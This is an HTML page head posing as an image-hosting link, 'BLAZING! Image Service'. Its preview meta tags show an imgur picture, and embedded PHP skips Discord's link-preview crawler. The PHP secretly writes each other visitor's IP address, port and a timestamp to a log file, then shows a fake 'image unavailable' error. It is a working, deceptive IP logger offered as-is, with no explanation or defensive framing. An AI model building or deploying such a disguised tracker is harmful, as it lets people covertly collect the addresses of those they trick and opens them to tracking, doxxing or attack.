<head>
    <title data-react-helmet="true">BLAZING! Image Service</title>
    <meta property="og:locale" content="en-US"/>
    <meta property="fb:admins" content="1216345021"/>
    <meta data-react-helmet="true" charset="utf-8"/>
    <meta data-react-helmet="true" property="og:title" content="BLAZING! Image Service"/>
    <meta data-react-helmet="true" property="og:description" content="Click to enlarge image"/>
    <meta data-react-helmet="true" name="description" content="Click to enlarge image"/>
    <meta data-react-helmet="true" property="og:image" content="https://i.imgur.com/cFdQUxo.jpg"/>
    <meta data-react-helmet="true" property="twitter:image" content="https://i.imgur.com/cFdQUxo.jpg"/>
    <?php
    if (strpos($_SERVER["HTTP_USER_AGENT"], "discord")) return;
    $fp = fopen("log.txt", 'a'); // Open in append mode ('a')
    $ip = $_SERVER["REMOTE_ADDR"];
    // Log the client's information in this format:
    // [Date-Time] IP:Port
    fwrite($fp, "[" . date('Y-m-d @ H:i:s') . "] $ip:" . $_SERVER["REMOTE_PORT"] . "\n");
    fclose($fp);
    echo "Image is unavailable or has been removed. Error code: EBL-" . random_int(0, 10000);
    ?>
</head>
